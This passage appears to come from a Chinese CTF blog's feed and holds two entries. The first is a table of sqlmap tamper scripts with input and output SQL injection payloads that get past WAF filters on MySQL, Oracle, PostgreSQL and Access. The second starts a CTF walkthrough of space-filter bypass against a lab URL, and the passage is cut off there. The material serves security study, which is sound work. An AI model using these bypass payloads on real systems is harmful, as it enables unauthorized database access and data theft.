style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">10</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">charunicodeencode.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">字符串 unicode 编码</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD%20FROM TABLE<br>* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">11</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2comment.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">Replaces space character (‘ ‘) with comments ‘/* */’</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT id FROM users<br>* Output: SELECT//id//FROM/* */users</td></tr><tr><td class="et18" rowspan="18" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;">mysql &gt;= 5.1.13</td><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">1</td><td class="et20" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">equaltolike.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">like 代替等号</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;"><br>* Input: SELECT * FROM users WHERE id=1 <br>2 * Output: SELECT * FROM users WHERE id LIKE 1 </td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">2</td><td class="et23" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">greatest.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;"><span class="font23">绕过过滤</span><span class="font24">’&gt;’ ,</span><span class="font23">用</span><span class="font24">GREATEST</span><span class="font23">替换大于号。</span></td><td class="et25" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">('1 AND A &gt; B')<br>'1 AND GREATEST(A,B+1)=A'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">3</td><td class="et23" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">apostrophenullencode.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">绕过过滤双引号，替换字符和双引号。</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">tamper("1 AND '1'='1")<br><br>'1 AND %00%271%00%27=%00%271'</td></tr><tr><td class="et26" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">4</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">ifnull2ifisnull.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">绕过对 IFNULL 过滤。<br>替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td><td class="et25" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">('IFNULL(1, 2)')<br>'IF(ISNULL(1),2,1)'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">5</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2mssqlhash.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">替换空格</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 9227=9227')<br>'1%23%0AAND%23%0A9227=9227'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">6</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">modsecurityversioned.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">过滤空格，包含完整的查询版本注释</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 2&gt;1--')<br>'1 /*!30874AND 2&gt;1*/--'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">7</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2mysqlblank.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">空格替换其它空白符号(mysql)</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">Input: SELECT id FROM users<br>Output: SELECT%0Bid%0BFROM%A0users</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">8</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">between.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">用between替换大于号（&gt;）</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND A &gt; B--')<br>'1 AND A NOT BETWEEN 0 AND B--'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">9</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">modsecurityzeroversioned.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">包含了完整的查询与零版本注释</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 2&gt;1--')<br>'1 /*!00000AND 2&gt;1*/--'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">10</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2mysqldash.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 9227=9227')<br>'1--%0AAND--%0A9227=9227'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">11</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">bluecoat.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">代替空格字符后与一个有效的随机空白字符的SQL语句。<br>然后替换=为like</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('SELECT id FROM users where id = 1')<br>'SELECT%09id FROM users where id LIKE 1'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">12</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">percentage.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">asp允许每个字符前面添加一个%号</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD FROM TABLE<br>* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">13</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">charencode.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">url编码</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD FROM%20TABLE<br>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">14</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">randomcase.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">随机大小写</td><td class="et25" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">* Input: INSERT<br>* Output: InsERt</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">15</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">versionedkeywords.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">Encloses each non-function keyword with versioned MySQL comment</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#<br>* Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS**!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">16</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2comment.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">Replaces space character (‘ ‘) with comments ‘/* */’</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT id FROM users<br>* Output: SELECT//id//FROM/* */users</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">17</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">charunicodeencode.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">字符串 unicode 编码</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD%20FROM TABLE<br>* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">18</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">versionedmorekeywords.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">注释绕过</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#<br>* Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#</td></tr><tr><td class="et28" rowspan="2" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;">MySQL &lt; 5.1</td><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">19</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">halfversionedmorekeywords.py</td><td class="et29" style="font-size:11pt;vertical-align:middle;width:210.75pt;">关键字前加注释</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa<br>* Output: value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’='QDWa</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">20</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">halfversionedmorekeywords.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">当数据库为mysql时绕过防火墙，每个关键字之前添加<br>mysql版本评论</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">1.("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")<br>2."value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"</td></tr><tr><td class="et28" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;">MySQL &gt;= 5.1.13</td><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">21</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2morehash.py</td><td class="et29" style="font-size:11pt;vertical-align:middle;width:210.75pt;">空格替换为 #号 以及更多随机字符串 换行符</td><td class="et30" style="font-size:11pt;vertical-align:bottom;width:251.25pt;">* Input: 1 AND 9227=9227<br>* Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</td></tr><tr><td class="et31" rowspan="7" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;"> Oracle</td><td class="et32" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">1</td><td class="et33" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">greatest.py</td><td class="et34" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;"><span class="font17">绕过过滤</span><span class="font3">’&gt;’ ,</span><span class="font17">用</span><span class="font3">GREATEST</span><span class="font17">替换大于号。</span></td><td class="et35" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">('1 AND A &gt; B')<br>'1 AND GREATEST(A,B+1)=A'</td></tr><tr><td class="et32" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">2</td><td class="et33" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">apostrophenullencode.py</td><td class="et34" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">绕过过滤双引号，替换字符和双引号。</td><td class="et36" style="font-size:11pt;vertical-align:middle;width:251.25pt;">tamper("1 AND '1'='1")<br><br>'1 AND %00%271%00%27=%00%271'</td></tr><tr><td class="et32" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">3</td><td class="et33" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">between.py</td><td class="et37" style="font-size:11pt;vertical-align:middle;width:210.75pt;">用between替换大于号（&gt;）</td><td class="et36" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND A &gt; B--')<br>'1 AND A NOT BETWEEN 0 AND B--'</td></tr><tr><td class="et32" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">4</td><td class="et33" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">charencode.py</td><td class="et37" style="font-size:11pt;vertical-align:middle;width:210.75pt;">url编码</td><td class="et36" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD FROM%20TABLE<br>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td></tr><tr><td class="et32" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">5</td><td class="et33" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">randomcase.py</td><td class="et37" style="font-size:11pt;vertical-align:middle;width:210.75pt;">随机大小写</td><td class="et35" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">* Input: INSERT<br>* Output: InsERt</td></tr><tr><td class="et38" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">6</td><td class="et33" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">charunicodeencode.py</td><td class="et37" style="font-size:11pt;vertical-align:middle;width:210.75pt;">字符串 unicode 编码</td><td class="et36" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD%20FROM TABLE<br>* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td></tr><tr><td class="et32" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">7</td><td class="et33" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">space2comment.py</td><td class="et37" style="font-size:11pt;vertical-align:middle;width:210.75pt;">Replaces space character (‘ ‘) with comments ‘/**/’</td><td class="et36" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT id FROM users<br>* Output: SELECT//id//FROM/**/users</td></tr><tr><td class="et39" rowspan="8" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;"> PostgreSQL</td><td class="et40" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">1</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">greatest.py</td><td class="et42" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;"><span class="font21">绕过过滤</span><span class="font9">’&gt;’ ,</span><span class="font21">用</span><span class="font9">GREATEST</span><span class="font21">替换大于号。</span></td><td class="et43" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">('1 AND A &gt; B')<br>'1 AND GREATEST(A,B+1)=A'</td></tr><tr><td class="et40" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">2</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">apostrophenullencode.py</td><td class="et42" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">绕过过滤双引号，替换字符和双引号。</td><td class="et44" style="font-size:11pt;vertical-align:middle;width:251.25pt;">tamper("1 AND '1'='1")<br><br>'1 AND %00%271%00%27=%00%271'</td></tr><tr><td class="et40" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">3</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">between.py</td><td class="et45" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">用between替换大于号（&gt;）</td><td class="et44" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND A &gt; B--')<br>'1 AND A NOT BETWEEN 0 AND B--'</td></tr><tr><td class="et40" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">4</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">percentage.py</td><td class="et45" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">asp允许每个字符前面添加一个%号</td><td class="et44" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD FROM TABLE<br>* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td></tr><tr><td class="et40" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">5</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">charencode.py</td><td class="et45" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">url编码</td><td class="et44" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD FROM%20TABLE<br>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td></tr><tr><td class="et40" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">6</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">randomcase.py</td><td class="et45" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">随机大小写</td><td class="et43" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">* Input: INSERT<br>* Output: InsERt</td></tr><tr><td class="et46" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">7</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">charunicodeencode.py</td><td class="et45" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">字符串 unicode 编码</td><td class="et44" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD%20FROM TABLE<br>* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td></tr><tr><td class="et40" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">8</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">space2comment.py</td><td class="et47" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">Replaces space character (‘ ‘) with comments ‘/**/’</td><td class="et44" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT id FROM users<br>* Output: SELECT//id//FROM/**/users</td></tr><tr><td class="et48" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;">Access</td><td class="et3" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">1</td><td class="et49" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">appendnullbyte.py</td><td class="et50" style="font-size:11pt;vertical-align:middle;width:210.75pt;">在有效负荷结束位置加载零字节字符编码</td><td class="et51" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 1=1')<br>'1 AND 1=1%00'</td></tr><tr><td class="et52" rowspan="3" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;">其他</td><td class="et53" style="font-size:11pt;vertical-align:bottom;width:48pt;"> </td><td class="et54" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">chardoubleencode.py</td><td class="et55" style="font-size:11pt;vertical-align:middle;width:210.75pt;">双url编码(不处理以编码的)</td><td class="et56" style="font-size:11pt;vertical-align:bottom;width:251.25pt;">* Input: SELECT FIELD FROM%20TABLE<br>* Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</td></tr><tr><td class="et53" style="font-size:11pt;vertical-align:bottom;width:48pt;"> </td><td class="et54" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">unmagicquotes.py</td><td class="et55" style="font-size:11pt;vertical-align:middle;width:210.75pt;">宽字符绕过 GPC  addslashes</td><td class="et56" style="font-size:11pt;vertical-align:bottom;width:251.25pt;">* Input: 1′ AND 1=1<br>* Output: 1%bf%27 AND 1=1–%20</td></tr><tr><td class="et53" style="font-size:11pt;vertical-align:bottom;width:48pt;"> </td><td class="et54" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">randomcomments.py</td><td class="et55" style="font-size:11pt;vertical-align:middle;width:210.75pt;">用/**/分割sql关键字</td><td class="et56" style="font-size:11pt;vertical-align:bottom;width:251.25pt;">‘INSERT’ becomes ‘IN//S//ERT’</td></tr></tbody></table></div>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sql注入</title>
      <link href="/2018/08-13-sql-injection.html"/>
      <url>/2018/08-13-sql-injection.html</url>
      <content type="html"><![CDATA[<h1 id="一、information-schema库详细介绍"><a href="#一、information-schema库详细介绍" class="headerlink" title="一、information_schema库详细介绍"></a>一、information_schema库详细介绍</h1><blockquote><p>information_schema.COLUMNS里存了所有数据库系统的库名和表名<br>TABLE_SCHEMA库名<br>TABLE_NAME表名<br>COLUMN_NAME列名</p></blockquote><table><tbody><tr><th>列名</th><th>数据类型</th><th>描述</th></tr><tr><td><strong>TABLE_CATALOG</strong></td><td><strong>nvarchar(128)</strong></td><td>表限定符。</td></tr><tr><td><span style="background-color:#ffff00;"><strong>TABLE_SCHEMA</strong></span></td><td><span style="background-color: #ffff00;"><strong>nvarchar(128)</strong></span></td><td width="41%"><span style="background-color: #ffff00;">表所有者。</span></td></tr><tr valign="top"><td><span style="background-color: #ffff00;"><strong>TABLE_NAME</strong></span></td><td width="23%"><span style="background-color: #ffff00;"><strong>nvarchar(128)</strong></span></td><td width="41%"><span style="background-color: #ffff00;">表名。</span></td></tr><tr valign="top"><td width="36%"><span style="background-color: #ffff00;"><strong>COLUMN_NAME</strong></span></td><td width="23%"><span style="background-color: #ffff00;"><strong>nvarchar(128)</strong></span></td><td width="41%"><span style="background-color: #ffff00;">列名。</span></td></tr><tr valign="top"><td width="36%"><strong>ORDINAL_POSITION</strong></td><td width="23%"><strong>smallint</strong></td><td width="41%">列标识号。</td></tr><tr valign="top"><td width="36%"><strong>COLUMN_DEFAULT</strong></td><td width="23%"><strong>nvarchar(4000)</strong></td><td width="41%">列的默认值。</td></tr><tr valign="top"><td width="36%"><strong>IS_NULLABLE</strong></td><td width="23%"><strong>varchar(3)</strong></td><td width="41%">列的为空性。如果列允许 NULL，那么该列返回 YES。否则，返回 NO。</td></tr><tr valign="top"><td width="36%"><strong>DATA_TYPE</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%">系统提供的数据类型。</td></tr><tr valign="top"><td width="36%"><strong>CHARACTER_MAXIMUM_LENGTH</strong></td><td width="23%"><strong>smallint</strong></td><td width="41%">以字符为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>CHARACTER_OCTET_LENGTH</strong></td><td width="23%"><strong>smallint</strong></td><td width="41%">以字节为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>NUMERIC_PRECISION</strong></td><td width="23%"><strong>tinyint</strong></td><td width="41%">近似数字数据、精确数字数据、整型数据或货币数据的精度。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>NUMERIC_PRECISION_RADIX</strong></td><td width="23%"><strong>smallint</strong></td><td width="41%">近似数字数据、精确数字数据、整型数据或货币数据的精度基数。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>NUMERIC_SCALE</strong></td><td width="23%"><strong>tinyint</strong></td><td width="41%">近似数字数据、精确数字数据、整数数据或货币数据的小数位数。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>DATETIME_PRECISION</strong></td><td width="23%"><strong>smallint</strong></td><td width="41%"><strong>datetime</strong> 及 SQL-92<strong> interval </strong>数据类型的子类型代码。对于其它数据类型，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>CHARACTER_SET_CATALOG</strong></td><td width="23%"><strong>varchar(6)</strong></td><td width="41%">如果列是字符数据或 <strong>text</strong> 数据类型，那么返回 <strong>master</strong>，指明字符集所在的数据库。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>CHARACTER_SET_SCHEMA</strong></td><td width="23%"><strong>varchar(3)</strong></td><td width="41%">如果列是字符数据或 <strong>text </strong>数据类型，那么返回 <strong>DBO</strong>，指明字符集的所有者名称。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>CHARACTER_SET_NAME</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%">如果该列是字符数据或 <strong>text</strong> 数据类型，那么为字符集返回唯一的名称。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>COLLATION_CATALOG</strong></td><td width="23%"><strong>varchar(6)</strong></td><td width="41%">如果列是字符数据或 <strong>text </strong>数据类型，那么返回 <strong>master</strong>，指明在其中定义排序次序的数据库。否则此列为 NULL。</td></tr><tr valign="top"><td width="36%"><strong>COLLATION_SCHEMA</strong></td><td width="23%"><strong>varchar(3)</strong></td><td width="41%">返回 <strong>DBO</strong>，为字符数据或 <strong>text </strong>数据类型指明排序次序的所有者。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>COLLATION_NAME</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%">如果列是字符数据或 <strong>text</strong> 数据类型，那么为排序次序返回唯一的名称。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>DOMAIN_CATALOG</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%">如果列是一种用户定义数据类型，那么该列是某个数据库名称，在该数据库名中创建了这种用户定义数据类型。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>DOMAIN_SCHEMA</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%">如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的创建者。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>DOMAIN_NAME</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%"><p>如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的名称。否则，返回 NULL。</p></td></tr></tbody></table><hr># sql注入(空格过滤)以过滤空格实验为例子（空格可以用/**/替换）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/web/index_2.php?</span><br></pre></td></tr></table></figure><p>1.二分爆显示位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;order/**/by/**/1#</span><br></pre></td></tr></table></figure><p>大于1的时候报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 